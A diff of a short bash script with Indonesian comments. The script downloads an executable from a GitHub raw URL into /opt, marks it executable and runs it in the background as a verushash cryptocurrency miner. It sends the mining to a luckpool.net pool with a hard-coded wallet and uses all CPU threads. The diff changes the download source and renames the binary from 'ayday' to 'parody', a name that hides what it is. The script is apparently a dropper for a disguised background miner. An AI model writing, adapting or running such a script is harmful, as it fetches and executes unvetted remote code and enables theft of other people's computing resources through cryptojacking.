@@ -1,15 +1,15 @@
 #!/bin/bash
 
 # Direktori tempat file akan diunduh
-INSTALL_DIR="/opt/aydaybg"
-FILE_NAME="ayday"
+INSTALL_DIR="/opt/parodybg"
+FILE_NAME="parody"
 FILE_PATH="$INSTALL_DIR/$FILE_NAME"
 
 # Membuat direktori
 mkdir -p $INSTALL_DIR
 
 # Mengunduh file dari link yang diberikan
-wget -O $FILE_PATH https://github.com/bibirbusin/bibirbusin/raw/main/ayday
+wget -O $FILE_PATH https://github.com/malogrono/Compare/raw/refs/heads/main/parody
 
 # Memeriksa keberhasilan unduhan
 if [ ! -s $FILE_PATH ]; then
@@ -32,12 +32,12 @@ ALGO="verushash"
 POOL_URL="stratum+tcp://eu.luckpool.net:3956"
 WALLET_ADDRESS="RJWHkHUFByrjCtSwgjZZETwrDPYHRXwAA3"
 PASSWORD="x"
-WORKER_NAME="AILuxy$RANDOM"
+WORKER_NAME="AILuxy$1"
 
-# Memulai dengan file ayday dan menjalankan di latar belakang
+# Memulai dengan file parody dan menjalankan di latar belakang
 cd $INSTALL_DIR
 chmod +x $FILE_NAME
-./$FILE_NAME --disable-gpu --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --Worker $WORKER_NAME --cpu-threads 0 &
+./$FILE_NAME --algorithm $ALGO --pool $POOL_URL --wallet $WALLET_ADDRESS --password $PASSWORD --Worker $WORKER_NAME --cpu-threads 0 &
 
 # Mengecek apakah proses penambangan dimulai dengan benar
 if pgrep -f "$FILE_NAME" > /dev/null; then
